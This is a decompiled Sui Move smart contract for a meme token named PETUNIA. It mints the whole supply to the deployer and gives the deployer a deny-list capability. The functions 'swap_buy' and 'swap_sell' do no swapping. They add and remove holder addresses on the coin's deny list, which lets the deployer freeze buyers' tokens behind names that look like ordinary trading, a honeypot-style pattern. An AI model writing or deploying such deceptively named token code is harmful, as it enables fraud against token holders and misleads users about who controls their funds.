module 0xc08cce091527b228a4f5944461cec28c0552eb7bb601cf06fb8cde3b26639fbe::petunia {
    struct PETUNIA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: PETUNIA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<PETUNIA>(arg0, 9, b"petunia", b"petunia_rocks", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/Qmd5hnnEe3Twifegg7idZ4gNd2MvhotFcriMb6dSmeuSe9"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<PETUNIA>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<PETUNIA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<PETUNIA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<PETUNIA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PETUNIA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<PETUNIA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<PETUNIA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<PETUNIA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

